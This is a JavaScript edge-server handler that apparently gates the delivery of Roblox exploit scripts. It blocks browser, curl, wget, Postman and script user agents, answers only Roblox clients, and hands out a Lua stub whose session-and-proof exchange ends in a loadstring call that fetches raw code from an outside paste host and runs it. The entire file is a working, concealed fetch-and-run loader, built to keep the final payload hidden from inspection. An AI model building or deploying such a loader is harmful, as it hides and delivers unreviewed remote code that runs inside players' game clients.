export const config = {
  runtime: "edge"
};

const sessions = new Map();
const ipAttempts = new Map();

function rateLimitCheck(ip) {
  const now = Date.now();
  const attempts = ipAttempts.get(ip) || [];
  const recent = attempts.filter(t => now - t < 60000);
  if (recent.length > 10) return true;
  recent.push(now);
  ipAttempts.set(ip, recent.slice(-15));
  return false;
}

export default async function handler(request) {
  const ua = request.headers.get("user-agent") || "";
  const url = new URL(request.url);
  const path = url.pathname;

  const ip =
    request.headers.get("x-forwarded-for")?.split(",")[0] ||
    "unknown";

  if (rateLimitCheck(ip)) {
    return new Response("wait(60)", { status: 200 });
  }

  const badUAs = [
    "Mozilla",
    "Chrome",
    "Safari",
    "Firefox",
    "curl",
    "wget",
    "Postman",
    "python",
    "node",
    "Java",
    "Go-http"
  ];

  if (badUAs.some(b => ua.includes(b))) {
    return new Response('error("blocked")', { status: 200 });
  }

  if (!ua.includes("Roblox")) {
    return new Response('error("invalid")', { status: 200 });
  }

  // === STEP 1 ===
  if (path === "/api" || path === "/") {
    const sid = crypto.randomUUID().replace(/-/g, "");
    const nonce = Math.floor(Math.random() * 1e9);
    const timestamp = Date.now();
    const key = (Math.floor(timestamp / 1000) ^ 0x5a5a) & 0xffff;

    sessions.set(sid, { nonce, key, timestamp, ip });
    setTimeout(() => sessions.delete(sid), 1500);

    return new Response(
`local base = "${url.origin}"
local sid = "${sid}"
local nonce = ${nonce}
local ts = ${timestamp}

local function calc()
  local k = ${key}
  local x1 = bit32.bxor(nonce, k)
  local x2 = bit32.bxor(x1, ts % 10000)
  return x2 + ${Math.floor(timestamp / 1000) % 1000}
end

local p = calc()
loadstring(game:HttpGet(base .. "/api/s/" .. sid .. "?p=" .. p .. "&t=" .. ts))()`,
      { headers: { "Content-Type": "text/plain" } }
    );
  }

  // === STEP 2 ===
  if (path.startsWith("/api/s/")) {
    const sid = path.slice(7);
    const proof = Number(url.searchParams.get("p"));
    const timestamp = Number(url.searchParams.get("t"));
    const session = sessions.get(sid);

    if (!session) return new Response('error("expired")');
    if (Math.abs(Date.now() - timestamp) > 2000)
      return new Response('error("timeout")');
    if (session.ip !== ip)
      return new Response('error("ip")');

    const x1 = session.nonce ^ session.key;
    const x2 = x1 ^ (timestamp % 10000);
    const expected =
      x2 + (Math.floor(session.timestamp / 1000) % 1000);

    sessions.delete(sid);

    if (proof !== expected) {
      const a = ipAttempts.get(ip) || [];
      a.push(Date.now());
      ipAttempts.set(ip, a);
      return new Response('error("invalid proof")');
    }

    return new Response(
`loadstring(game:HttpGet("https://ghostbin.axel.org/paste/tv9rj/raw"))()`,
      { headers: { "Content-Type": "text/plain" } }
    );
  }

  return new Response('error("denied")');
}
